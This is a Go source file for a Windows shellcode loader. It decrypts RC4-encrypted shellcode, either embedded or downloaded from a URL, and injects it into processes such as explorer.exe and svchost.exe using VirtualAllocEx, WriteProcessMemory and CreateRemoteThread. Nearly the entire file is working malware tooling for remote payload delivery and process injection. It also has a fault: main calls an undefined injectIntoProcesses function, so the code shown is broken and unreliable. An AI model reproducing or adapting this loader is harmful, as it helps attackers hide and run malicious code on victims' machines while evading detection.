package main

import (
	_ "embed"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

//go:embed enc_shellcode.bin
var defaultShellcode []byte

var (
	shellcodeKey = flag.String("key", "4e7dcab66fcea67a05cc739d8f047443", "Hex-encoded key for RC4 decryption")
	shellcodeURL = flag.String("url", "", "Optional URL to fetch the encrypted shellcode")
	keyURL       = flag.String("keyurl", "", "Optional URL to fetch the RC4 key")
	procNames    = flag.String("procs", "explorer.exe,svchost.exe", "Comma-separated list of processes to inject into")

	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	virtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory       = kernel32.NewProc("WriteProcessMemory")
	createRemoteThread       = kernel32.NewProc("CreateRemoteThread")
	createToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	process32First           = kernel32.NewProc("Process32FirstW")
	process32Next            = kernel32.NewProc("Process32NextW")
	openProcessSyscall       = kernel32.NewProc("OpenProcess")
	virtualProtectEx         = kernel32.NewProc("VirtualProtectEx")
	procSystemFunction032    = syscall.NewLazyDLL("advapi32.dll").NewProc("SystemFunction032")
)

const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
	TH32CS_SNAPPROCESS     = 0x00000002
	INVALID_HANDLE_VALUE   = ^uintptr(0)
)

type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

type CRYPT_BUFFER struct {
	Length        uint32
	MaximumLength uint32
	Buffer        *byte
}

type ProcessInfo struct {
	Name string
	PID  uint32
}

func main() {
	flag.Parse()

	encryptedShellcode := defaultShellcode
	if *shellcodeURL != "" {
		buf, err := fetchRemote(*shellcodeURL)
		if err != nil {
			fmt.Printf("[-] Failed to fetch shellcode: %v\n", err)
			return
		}
		encryptedShellcode = buf
	}

	keyHex := *shellcodeKey
	if *keyURL != "" {
		buf, err := fetchRemote(*keyURL)
		if err != nil {
			fmt.Printf("[-] Failed to fetch key: %v\n", err)
			return
		}
		keyHex = strings.TrimSpace(string(buf))
	}

	key, err := hex.DecodeString(keyHex)
	if err != nil {
		fmt.Println("Invalid key format. Must be hex-encoded.")
		return
	}

	targets := strings.Split(*procNames, ",")
	injectIntoProcesses(targets, encryptedShellcode, key)
}

func fetchRemote(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return ioutil.ReadAll(resp.Body)
}

func FindTargets(procNames []string) []ProcessInfo {
	hProcSnap, _, _ := createToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if hProcSnap == uintptr(INVALID_HANDLE_VALUE) {
		return nil
	}
	defer syscall.CloseHandle(syscall.Handle(hProcSnap))

	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))
	ret, _, _ := process32First.Call(hProcSnap, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return nil
	}

	targets := []ProcessInfo{}
	for {
		name := syscall.UTF16ToString(pe32.szExeFile[:])
		for _, target := range procNames {
			if strings.EqualFold(name, target) {
				targets = append(targets, ProcessInfo{Name: name, PID: pe32.th32ProcessID})
			}
		}
		ret, _, _ = process32Next.Call(hProcSnap, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}
	return targets
}

func injectIntoFirstProcess(procNames []string, encryptedShellcode, key []byte) {
	targets := FindTargets(procNames)
	if len(targets) == 0 {
		fmt.Println("No target processes found.")
		return
	}

	target := targets[0]
	hProcess, err := openProcess(PROCESS_ALL_ACCESS, false, target.PID)
	if err != nil {
		fmt.Printf("[-] Failed to open process %s (PID: %d)\n", target.Name, target.PID)
		return
	}
	fmt.Printf("[+] Opened %s (PID: %d)\n", target.Name, target.PID)
	injectAndExecuteDecryption(hProcess, encryptedShellcode, key)
}

func injectAndExecuteDecryption(hProcess syscall.Handle, encryptedShellcode, key []byte) bool {
	size := len(encryptedShellcode)
	keySize := len(key)

	remoteShellcodeAddr, _, _ := virtualAllocEx.Call(uintptr(hProcess), 0, uintptr(size), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	remoteKeyAddr, _, _ := virtualAllocEx.Call(uintptr(hProcess), 0, uintptr(keySize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	writeProcessMemory.Call(uintptr(hProcess), remoteShellcodeAddr, uintptr(unsafe.Pointer(&encryptedShellcode[0])), uintptr(size), 0)
	writeProcessMemory.Call(uintptr(hProcess), remoteKeyAddr, uintptr(unsafe.Pointer(&key[0])), uintptr(keySize), 0)

	localShellcode := make([]byte, size)
	windows.ReadProcessMemory(windows.Handle(hProcess), remoteShellcodeAddr, &localShellcode[0], uintptr(size), nil)

	keyBuffer := CRYPT_BUFFER{Length: uint32(len(key)), MaximumLength: uint32(len(key)), Buffer: &key[0]}
	shellcodeBuffer := CRYPT_BUFFER{Length: uint32(size), MaximumLength: uint32(size), Buffer: &localShellcode[0]}

	procSystemFunction032.Call(uintptr(unsafe.Pointer(&shellcodeBuffer)), uintptr(unsafe.Pointer(&keyBuffer)))
	windows.WriteProcessMemory(windows.Handle(hProcess), remoteShellcodeAddr, &localShellcode[0], uintptr(size), nil)

	var oldProtect uint32
	virtualProtectEx.Call(uintptr(hProcess), remoteShellcodeAddr, uintptr(size), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))

	createRemoteThread.Call(uintptr(hProcess), 0, 0, remoteShellcodeAddr, 0, 0, 0)
	fmt.Println("[+] Shellcode injected and executed")
	return true
}

func openProcess(desiredAccess uint32, inheritHandle bool, pid uint32) (syscall.Handle, error) {
	h, _, err := openProcessSyscall.Call(uintptr(desiredAccess), uintptr(boolToUintptr(inheritHandle)), uintptr(pid))
	if h == 0 {
		return 0, err
	}
	return syscall.Handle(h), nil
}

func boolToUintptr(b bool) uintptr {
	if b {
		return 1
	}
	return 0
}
